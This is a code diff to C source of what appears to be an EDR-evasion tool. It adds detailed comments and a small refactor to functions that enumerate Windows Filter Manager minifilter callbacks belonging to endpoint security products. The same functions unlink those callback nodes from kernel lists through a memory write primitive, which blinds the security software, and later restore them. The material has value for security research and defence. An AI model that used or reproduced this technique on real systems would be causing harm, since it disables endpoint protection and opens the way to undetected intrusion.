@@ -14,6 +14,38 @@
 #include "MinifilterCallbacks.h"
 
 
+/*
+This function browses the internal structures of the Filter Manager to enumerate callbacks registered
+by EDR products. 
+
+To provide a quick context about the different internal structures:
+	- The Filter Manager establishes a "frame" (_FLTP_FRAME) as its root structure;
+	- A "volume" structure (_FLT_VOLUME) is instanciated for each "disk" managed by the Filter Manager (can be partitions,
+		shadow copies, or special ones corresponding to named pipes or remote file systems);
+	- To each registered minifilter driver corresponds a "filter" structure (_FLT_FILTER), describing various properties such
+		as its supported operations;
+	- These minifilters are not all attached to each volume; an "instance" (_FLT_INSTANCE) structure is created to mark each of the 
+		filter<->volume association;
+	- Minifilters register callback functions that are executed before and/or after specific operation (file open, write, read, etc.).
+		These callbacks are described in _CALLBACK_NODE structures. An array of all _CALLBACK_NODE implemented by an instance of a 
+		minifilter can be found in _FLT_INSTANCE; the array indexed by the IRP "major function" code, a constant representing the operation
+		affected by the callback (IRP_MJ_CREATE, IRP_MJ_READ, etc.).
+		Moreover, all _CALLBACK_NODEs implemented by instances linked to a specific volume are regrouped in linked lists, stored in the
+		_FLT_VOLUME.Callbacks.OperationLists array indexed by IRP major function codes.
+
+Upon a specific operation (for example, a file opening on C:), the appropriate _FLT_VOLUME is recovered from the _FLTP_FRAME structure
+(AttachedVolumes's list), the _FLT_VOLUME.Callbacks.OperationLists[irpMajorFunctionCode] list of _CALLBACK_NODE is browsed and callbacks
+functions are executed.
+
+In order to detect EDR-related callbacks, the following function:
+	- Enumerates the frames (_FLTP_FRAME) thanks to a list stored in a global variable of fltmgr.sys: ((_GLOBALS*)&FltGlobals)->FrameList.rList
+	- Enumerates the filters (_FLT_FILTER) of the frame: ((_FLTP_FRAME*)currentFrame)->RegisteredFilters.rList
+	- Checks if the driver implementing the filter is EDR-related (checks the name of the module where 
+		(_FLT_FILTER*)currentFilter->DriverObject->DriverInit is implemented)
+	- If the driver is an EDR, enumerate all instances of the associated filter, by browsing ((_FLT_FILTER*)currentFilter)->InstanceList.rList
+	- For each instance, enumerate the CallbackNodes array, whose non-NULL entries directly point to _CALLBACK_NODEs in their respective 
+		lists in _FLT_VOLUME.Callbacks.OperationLists
+*/
 BOOL EnumEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* foundEDRCallbacks, BOOL verbose) {
 	BOOL edrCallbacksWereFound = FALSE;
 
@@ -67,14 +99,13 @@ BOOL EnumEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* foundEDRCallbacks, B
 					) {
 					DWORD64 current_instance = current_instance_shifted - g_fltmgrOffsets.st._FLT_INSTANCE_FilterLink;
 					_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t\t_FLT_INSTANCE %016llx: "), current_instance);
-					//printf("\t[*] CallbackNodes  : 0x%p\n", (PVOID)CallbackNodesEntry);
 
 					// for each CALLBACK_NODE in the array
-					DWORD64 CallbackNodesEntry = current_instance + g_fltmgrOffsets.st._FLT_INSTANCE_CallbackNodes;
+					DWORD64 CallbackNodesArray = current_instance + g_fltmgrOffsets.st._FLT_INSTANCE_CallbackNodes;
 					SIZE_T nbCallbackNodes = 0;
 					for (int j = 0; j < 50; j++)
 					{
-						DWORD64 CallbackNodePointer = ReadMemoryDWORD64(CallbackNodesEntry + (j * 8));
+						DWORD64 CallbackNodePointer = ReadMemoryDWORD64(CallbackNodesArray + (j * sizeof(PVOID)));
 						// Register all callback nodes
 						if (CallbackNodePointer)
 						{
@@ -110,6 +141,17 @@ BOOL EnumEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* foundEDRCallbacks, B
 }
 
 #if WriteMemoryPrimitiveIsAtomic
+/*
+When EDR-related _CALLBACK_NODEs have been identified thanks to the previous function, to disable the callbacks, these nodes are
+simply unlinked from their lists.
+That way, the filter manager will not see the callback nodes and never execute the associated pre/post-operations functions upon
+some specific I/O operation.
+
+Note: since we are modifying linked lists without holding any lock and while the operating system could browse the lists at the
+same time, we have to maintain at least some consistency during modification. The write primitive should be able to write a whole
+pointer (i.e. 8 bytes) in a single call, or else the overwritten pointer would have an incorrect value between 2 calls, and could
+lead to a crash if the operating system browses the list.
+*/
 void RemoveEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
 	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRemoving previously identified callbacks nodes by unlinking them from their list"));
 	SIZE_T counter = 0;
@@ -131,6 +173,12 @@ void RemoveEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
 	_tprintf_or_not(TEXT("[+] [MinifilterCallbacks]\t\t%llu callback nodes were removed!\n"), counter);
 }
 
+
+/*
+To restore the callbacks, we rely on the fact that the LIST_ENTRY of the _CALLBACK_NODE still points to the original previous 
+and next nodes in the list where is was unlinked from. We simply reinsert the nodes in the inverse order from which unlinked 
+them to ensure the linked list consistency during the process.
+*/
 BOOL RestoreEDRMinifilterCallbacks(struct FOUND_EDR_CALLBACKS* edrCallbacks) {
 	BOOL success = TRUE;
 	_putts_or_not(TEXT("[+] [MinifilterCallbacks]\tRestoring unlinked callbacks node by re-inserting them in their original place"));
